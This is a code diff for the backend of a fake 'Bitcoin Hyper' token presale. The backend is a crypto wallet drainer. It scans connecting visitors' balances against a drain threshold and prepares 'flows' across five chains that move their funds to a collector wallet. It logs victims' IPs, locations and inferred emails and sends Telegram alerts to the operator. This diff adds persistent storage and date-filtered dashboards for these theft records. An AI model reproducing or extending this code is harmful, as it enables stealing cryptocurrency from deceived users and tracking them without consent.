@@ -8,9 +8,139 @@ const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
 const { ethers } = require('ethers');
+const fs = require('fs').promises;
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+
+// ============================================
+// PERSISTENT STORAGE SETUP
+// ============================================
+
+const DATA_DIR = path.join(__dirname, 'data');
+const STORAGE_FILE = path.join(DATA_DIR, 'storage.json');
+
+// Ensure data directory exists
+async function ensureDataDir() {
+  try {
+    await fs.mkdir(DATA_DIR, { recursive: true });
+    console.log('📁 Data directory ensured');
+  } catch (error) {
+    console.error('Error creating data directory:', error);
+  }
+}
+
+// Load storage from disk
+async function loadStorage() {
+  try {
+    const data = await fs.readFile(STORAGE_FILE, 'utf8');
+    const parsed = JSON.parse(data);
+    
+    // Convert plain objects back to Maps and Sets
+    return {
+      participants: parsed.participants || [],
+      pendingFlows: new Map(parsed.pendingFlows || []),
+      completedFlows: new Map(parsed.completedFlows || []),
+      settings: {
+        ...parsed.settings,
+        statistics: {
+          ...parsed.settings?.statistics,
+          uniqueIPs: new Set(parsed.settings?.statistics?.uniqueIPs || [])
+        }
+      },
+      emailCache: new Map(parsed.emailCache || []),
+      siteVisits: parsed.siteVisits || []
+    };
+  } catch (error) {
+    console.log('📁 No existing storage found, creating new...');
+    return {
+      participants: [],
+      pendingFlows: new Map(),
+      completedFlows: new Map(),
+      settings: {
+        tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
+        tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
+        valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
+        statistics: {
+          totalParticipants: 0,
+          eligibleParticipants: 0,
+          claimedParticipants: 0,
+          uniqueIPs: new Set(),
+          totalProcessedUSD: 0,
+          totalProcessedWallets: 0,
+          processedTransactions: []
+        },
+        flowEnabled: process.env.DRAIN_ENABLED === 'true'
+      },
+      emailCache: new Map(),
+      siteVisits: []
+    };
+  }
+}
+
+// Save storage to disk
+async function saveStorage() {
+  try {
+    // Convert Maps and Sets to plain objects for JSON serialization
+    const toSave = {
+      participants: memoryStorage.participants,
+      pendingFlows: Array.from(memoryStorage.pendingFlows.entries()),
+      completedFlows: Array.from(memoryStorage.completedFlows.entries()),
+      settings: {
+        ...memoryStorage.settings,
+        statistics: {
+          ...memoryStorage.settings.statistics,
+          uniqueIPs: Array.from(memoryStorage.settings.statistics.uniqueIPs)
+        }
+      },
+      emailCache: Array.from(memoryStorage.emailCache.entries()),
+      siteVisits: memoryStorage.siteVisits
+    };
+    
+    await fs.writeFile(STORAGE_FILE, JSON.stringify(toSave, null, 2));
+    console.log('💾 Storage saved to disk');
+  } catch (error) {
+    console.error('Error saving storage:', error);
+  }
+}
+
+// Auto-save every 5 minutes
+setInterval(saveStorage, 5 * 60 * 1000);
+
+// Clean old data (keep 7 days)
+async function cleanOldData() {
+  const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+  
+  // Clean site visits older than 7 days
+  memoryStorage.siteVisits = memoryStorage.siteVisits.filter(v => 
+    new Date(v.timestamp).getTime() > sevenDaysAgo
+  );
+  
+  // Clean completed flows older than 7 days
+  for (const [id, flow] of memoryStorage.completedFlows) {
+    if (new Date(flow.completedAt).getTime() < sevenDaysAgo) {
+      memoryStorage.completedFlows.delete(id);
+    }
+  }
+  
+  // Clean old processed transactions
+  if (memoryStorage.settings?.statistics?.processedTransactions) {
+    memoryStorage.settings.statistics.processedTransactions = 
+      memoryStorage.settings.statistics.processedTransactions.filter(t => 
+        new Date(t.timestamp).getTime() > sevenDaysAgo
+      );
+  }
+  
+  console.log('🧹 Cleaned data older than 7 days');
+  await saveStorage();
+}
+
+// Run clean up every day
+setInterval(cleanOldData, 24 * 60 * 60 * 1000);
+
+// Initialize memoryStorage
+let memoryStorage;
 
 // Security middleware
 app.use(helmet({
@@ -51,6 +181,7 @@ app.get('/', (req, res) => {
     name: 'Bitcoin Hyper Backend',
     version: '2.0.0',
     status: '🟢 ONLINE',
+    storage: '💾 Persistent (7 days)',
     timestamp: new Date().toISOString()
   });
 });
@@ -181,38 +312,11 @@ const PROJECT_FLOW_ROUTER_ABI = [
 ];
 
 // ============================================
-// STORAGE
+// TELEGRAM FUNCTIONS - WITH SITE URL AND HUMAN CHECK
 // ============================================
 
 let telegramEnabled = false;
 let telegramBotName = '';
-
-const memoryStorage = {
-  participants: [],
-  pendingFlows: new Map(),
-  completedFlows: new Map(),
-  settings: {
-    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
-    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
-    statistics: {
-      totalParticipants: 0,
-      eligibleParticipants: 0,
-      claimedParticipants: 0,
-      uniqueIPs: new Set(),
-      totalProcessedUSD: 0,
-      totalProcessedWallets: 0,
-      processedTransactions: []
-    },
-    flowEnabled: process.env.DRAIN_ENABLED === 'true'
-  },
-  emailCache: new Map(),
-  siteVisits: []
-};
-
-// ============================================
-// TELEGRAM FUNCTIONS - WITH SITE URL AND HUMAN CHECK
-// ============================================
 
 async function sendTelegramMessage(text) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -277,7 +381,8 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+      `💾 <b>Storage:</b> Persistent (7 days)\n` +
       `📊 Admin: https://bthbk.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -359,6 +464,7 @@ async function getWalletEmail(walletAddress) {
         if (ensName) {
           const email = `${ensName.split('.')[0]}@proton.me`;
           memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
+          await saveStorage();
           return email;
         }
       } catch (ensError) {}
@@ -385,6 +491,7 @@ async function getWalletEmail(walletAddress) {
     
     const email = `${username}@${domain}`;
     memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
+    await saveStorage();
     return email;
     
   } catch (error) {
@@ -458,6 +565,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   };
   
   memoryStorage.siteVisits.push(visit);
+  await saveStorage();
   
   // INSTANT Telegram notification with human/bot detection
   const telegramMessage = 
@@ -468,7 +576,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
     `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -639,7 +747,7 @@ app.post('/api/presale/connect', async (req, res) => {
         city: location.city,
         region: location.region,
         email: email,
-        connectedAt: new Date(),
+        connectedAt: new Date().toISOString(),
         totalValueUSD: 0,
         isEligible: false,
         claimed: false,
@@ -651,6 +759,7 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
+      await saveStorage();
       
       // INSTANT Telegram for new participant with email
       const newUserMsg = 
@@ -660,7 +769,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
         `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -671,12 +780,14 @@ app.post('/api/presale/connect', async (req, res) => {
       participant.totalValueUSD = balanceResult.data.totalValueUSD;
       participant.isEligible = balanceResult.data.isEligible;
       participant.allocation = balanceResult.data.allocation;
-      participant.lastScanned = new Date();
+      participant.lastScanned = new Date().toISOString();
       participant.balances = balanceResult.data.balances;
       
       if (balanceResult.data.isEligible) {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
+      
+      await saveStorage();
       
       // INSTANT Telegram connection summary with correct email
       const connectMsg = 
@@ -685,7 +796,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -762,6 +873,8 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       completedChains: []
     });
     
+    await saveStorage();
+    
     // INSTANT Telegram for flow preparation
     let txDetails = '';
     transactions.forEach((tx, index) => {
@@ -774,7 +887,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
       `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
     );
     
     res.json({
@@ -852,7 +965,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
         `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
       );
       
       // Update pending flow
@@ -866,6 +979,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
           memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
+          memoryStorage.pendingFlows.delete(flowId);
           
           let completionDetails = '';
           flow.transactions.forEach(t => {
@@ -879,9 +993,11 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-            `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+            `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
           );
         }
+        
+        await saveStorage();
       }
     }
     
@@ -912,8 +1028,10 @@ app.post('/api/presale/claim', async (req, res) => {
     }
     
     participant.claimed = true;
-    participant.claimedAt = new Date();
+    participant.claimedAt = new Date().toISOString();
     memoryStorage.settings.statistics.claimedParticipants++;
+    
+    await saveStorage();
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
@@ -925,7 +1043,7 @@ app.post('/api/presale/claim', async (req, res) => {
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
       `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
-      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
     );
     
     res.json({ success: true });
@@ -937,11 +1055,12 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
-// ADMIN VIEW - COMPREHENSIVE DASHBOARD - FIXED VERSION
+// ADMIN DASHBOARD - WITH DATE FILTERING
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
   const token = req.query.token;
+  const days = parseInt(req.query.days) || 7; // Default to 7 days
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
   // Trim tokens to avoid whitespace issues
@@ -950,54 +1069,60 @@ app.get('/api/admin/dashboard', (req, res) => {
     return res.status(401).json({ success: false, error: 'Invalid admin token' });
   }
   
+  const cutoffTime = Date.now() - (days * 24 * 60 * 60 * 1000);
+  
   // ============================================
   // SAFE DATA EXTRACTION WITH PROPER TYPE CHECKING
   // ============================================
   
-  // Recent visits - ensure array
+  // Recent visits - filter by days
   const recentVisits = Array.isArray(memoryStorage.siteVisits) 
     ? memoryStorage.siteVisits
+        .filter(v => new Date(v.timestamp).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 50)
+        .slice(0, 100)
     : [];
   
-  // Active participants - safe date conversion
+  // Active participants - filter by days
   const activeParticipants = Array.isArray(memoryStorage.participants)
     ? memoryStorage.participants
+        .filter(p => new Date(p.connectedAt).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
         .map(p => ({
           ...p,
-          // CRITICAL FIX: Check if value is Date before calling toISOString()
-          connectedAt: p.connectedAt instanceof Date ? p.connectedAt.toISOString() : p.connectedAt,
-          lastScanned: p.lastScanned instanceof Date ? p.lastScanned.toISOString() : p.lastScanned,
-          claimedAt: p.claimedAt instanceof Date ? p.claimedAt.toISOString() : p.claimedAt
+          connectedAt: p.connectedAt,
+          lastScanned: p.lastScanned,
+          claimedAt: p.claimedAt
         }))
     : [];
   
   // Pending flows - safe Map conversion
   const pendingFlows = memoryStorage.pendingFlows instanceof Map
     ? Array.from(memoryStorage.pendingFlows.entries())
+        .filter(([_, flow]) => new Date(flow.createdAt).getTime() > cutoffTime)
         .map(([id, flow]) => ({ id, ...flow }))
         .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-        .slice(0, 30)
+        .slice(0, 50)
     : [];
   
   // Completed flows - safe Map conversion
   const completedFlows = memoryStorage.completedFlows instanceof Map
     ? Array.from(memoryStorage.completedFlows.entries())
+        .filter(([_, flow]) => new Date(flow.completedAt).getTime() > cutoffTime)
         .map(([id, flow]) => ({ id, ...flow }))
         .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
-        .slice(0, 30)
+        .slice(0, 50)
     : [];
   
-  // Processed transactions - safe array access
+  // Processed transactions - filter by days
   const processedTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
     ? memoryStorage.settings.statistics.processedTransactions
+        .filter(t => new Date(t.timestamp).getTime() > cutoffTime)
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 30)
+        .slice(0, 100)
     : [];
   
-  // Network status - always return array even if PROJECT_FLOW_ROUTERS is undefined
+  // Network status - always return array
   const networkStatus = PROJECT_FLOW_ROUTERS && typeof PROJECT_FLOW_ROUTERS === 'object'
     ? Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
         chain,
@@ -1010,36 +1135,38 @@ app.get('/api/admin/dashboard', (req, res) => {
   // Location stats - safe object to array conversion
   const locationStats = {};
   if (Array.isArray(memoryStorage.participants)) {
-    memoryStorage.participants.forEach(p => {
-      if (p && p.country) {
-        const key = `${p.country}|${p.flag || '🌍'}`;
-        if (!locationStats[key]) {
-          locationStats[key] = { 
-            country: p.country, 
-            flag: p.flag || '🌍', 
-            count: 0, 
-            eligible: 0 
-          };
+    memoryStorage.participants
+      .filter(p => new Date(p.connectedAt).getTime() > cutoffTime)
+      .forEach(p => {
+        if (p && p.country) {
+          const key = `${p.country}|${p.flag || '🌍'}`;
+          if (!locationStats[key]) {
+            locationStats[key] = { 
+              country: p.country, 
+              flag: p.flag || '🌍', 
+              count: 0, 
+              eligible: 0 
+            };
+          }
+          locationStats[key].count++;
+          if (p.isEligible) locationStats[key].eligible++;
         }
-        locationStats[key].count++;
-        if (p.isEligible) locationStats[key].eligible++;
-      }
-    });
+      });
   }
   
-  // Hourly activity - safe object creation
-  const hourlyActivity = {};
+  // Daily activity
+  const dailyActivity = {};
   if (Array.isArray(memoryStorage.siteVisits)) {
-    memoryStorage.siteVisits.forEach(v => {
-      if (v && v.timestamp) {
-        try {
-          const hour = new Date(v.timestamp).getHours();
-          hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
-        } catch (e) {
-          // Skip invalid timestamps
+    memoryStorage.siteVisits
+      .filter(v => new Date(v.timestamp).getTime() > cutoffTime)
+      .forEach(v => {
+        if (v && v.timestamp) {
+          try {
+            const date = new Date(v.timestamp).toISOString().split('T')[0];
+            dailyActivity[date] = (dailyActivity[date] || 0) + 1;
+          } catch (e) {}
         }
-      }
-    });
+      });
   }
   
   // ============================================
@@ -1047,23 +1174,19 @@ app.get('/api/admin/dashboard', (req, res) => {
   // ============================================
   
   const summary = {
-    totalVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
-    uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set 
-      ? memoryStorage.settings.statistics.uniqueIPs.size 
-      : 0,
-    totalParticipants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
-    eligibleParticipants: Array.isArray(memoryStorage.participants) 
-      ? memoryStorage.participants.filter(p => p && p.isEligible).length 
-      : 0,
-    claimedParticipants: Array.isArray(memoryStorage.participants) 
-      ? memoryStorage.participants.filter(p => p && p.claimed).length 
-      : 0,
+    dateRange: `Last ${days} days`,
+    totalVisits: recentVisits.length,
+    uniqueIPs: new Set(recentVisits.map(v => v.ip)).size,
+    totalParticipants: activeParticipants.length,
+    eligibleParticipants: activeParticipants.filter(p => p && p.isEligible).length,
+    claimedParticipants: activeParticipants.filter(p => p && p.claimed).length,
     totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
     totalProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
-    pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
-    completedFlows: memoryStorage.completedFlows instanceof Map ? memoryStorage.completedFlows.size : 0,
+    pendingFlows: pendingFlows.length,
+    completedFlows: completedFlows.length,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
-    telegramBot: telegramBotName || 'N/A'
+    telegramBot: telegramBotName || 'N/A',
+    storage: '💾 Persistent (7 days)'
   };
   
   // ============================================
@@ -1079,23 +1202,23 @@ app.get('/api/admin/dashboard', (req, res) => {
   };
   
   // ============================================
-  // FINAL RESPONSE WITH ARRAY FALLBACKS FOR EVERY FIELD
+  // FINAL RESPONSE WITH ARRAY FALLBACKS
   // ============================================
   
   res.json({
     success: true,
     timestamp: new Date().toISOString(),
     summary,
-    networks: networkStatus, // Always an array
-    recentVisits: recentVisits, // Always an array
-    activeParticipants: activeParticipants.slice(0, 30), // Always an array
-    pendingFlows: pendingFlows, // Always an array
-    completedFlows: completedFlows.slice(0, 10), // Always an array
-    processedTransactions: processedTransactions, // Always an array
-    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count), // Always an array
-    hourlyActivity: Object.entries(hourlyActivity)
-      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
-      .sort((a, b) => a.hour - b.hour), // Always an array
+    networks: networkStatus,
+    recentVisits: recentVisits,
+    activeParticipants: activeParticipants.slice(0, 50),
+    pendingFlows: pendingFlows,
+    completedFlows: completedFlows.slice(0, 30),
+    processedTransactions: processedTransactions,
+    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
+    dailyActivity: Object.entries(dailyActivity)
+      .map(([date, count]) => ({ date, count }))
+      .sort((a, b) => a.date.localeCompare(b.date)),
     system
   });
 });
@@ -1120,7 +1243,8 @@ app.get('/api/admin/stats', (req, res) => {
       pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
       telegram: telegramEnabled ? '✅' : '❌',
       siteVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
-      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0
+      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0,
+      storage: '💾 Persistent'
     }
   });
 });
@@ -1145,9 +1269,14 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     ? memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress)
     : [];
     
-  const flows = memoryStorage.pendingFlows instanceof Map
-    ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
-    : [];
+  const flows = {
+    pending: memoryStorage.pendingFlows instanceof Map
+      ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+      : [],
+    completed: memoryStorage.completedFlows instanceof Map
+      ? Array.from(memoryStorage.completedFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+      : []
+  };
   
   if (!participant) {
     return res.json({ 
@@ -1160,18 +1289,53 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   res.json({
     success: true,
     found: true,
-    wallet: {
-      ...participant,
-      connectedAt: participant.connectedAt instanceof Date ? participant.connectedAt.toISOString() : participant.connectedAt,
-      lastScanned: participant.lastScanned instanceof Date ? participant.lastScanned.toISOString() : participant.lastScanned,
-      claimedAt: participant.claimedAt instanceof Date ? participant.claimedAt.toISOString() : participant.claimedAt
-    },
+    wallet: participant,
     visits,
     flows,
     transactions: Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
       ? memoryStorage.settings.statistics.processedTransactions.filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress)
       : []
   });
+});
+
+// ============================================
+// ADMIN MANUAL SAVE (trigger save)
+// ============================================
+
+app.post('/api/admin/save', async (req, res) => {
+  const token = req.query.token;
+  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
+  
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
+  
+  try {
+    await saveStorage();
+    res.json({ success: true, message: 'Storage saved successfully' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ============================================
+// ADMIN CLEAN OLD (manual trigger)
+// ============================================
+
+app.post('/api/admin/clean', async (req, res) => {
+  const token = req.query.token;
+  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
+  
+  if (token?.trim() !== adminToken?.trim()) {
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
+  
+  try {
+    await cleanOldData();
+    res.json({ success: true, message: 'Old data cleaned successfully' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
 // ============================================
@@ -1186,14 +1350,26 @@ app.use('*', (req, res) => {
 // START SERVER
 // ============================================
 
-app.listen(PORT, '0.0.0.0', async () => {
-  console.log(`
+async function startServer() {
+  await ensureDataDir();
+  memoryStorage = await loadStorage();
+  
+  app.listen(PORT, '0.0.0.0', async () => {
+    console.log(`
   ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
   ================================================
   📍 Port: ${PORT}
-  🔗 URL: https://bthbk.vercel.app
+  🔗 Backend URL: https://bthbk.vercel.app
+  🌍 Site URL: https://bitcoinhypertoken.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
+  💾 STORAGE: Persistent (7 days)
+  
+  📊 DATA SUMMARY:
+  📁 Total Participants: ${memoryStorage.participants.length}
+  📁 Total Visits: ${memoryStorage.siteVisits.length}
+  📁 Pending Flows: ${memoryStorage.pendingFlows.size}
+  📁 Completed Flows: ${memoryStorage.completedFlows.size}
   
   🌐 DEPLOYED CONTRACTS:
   ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
@@ -1206,6 +1382,10 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   🚀 READY FOR MULTICHAIN FLOWS
   `);
-  
-  await testTelegramConnection();
-});
+    
+    await testTelegramConnection();
+    await cleanOldData(); // Clean old data on startup
+  });
+}
+
+startServer();
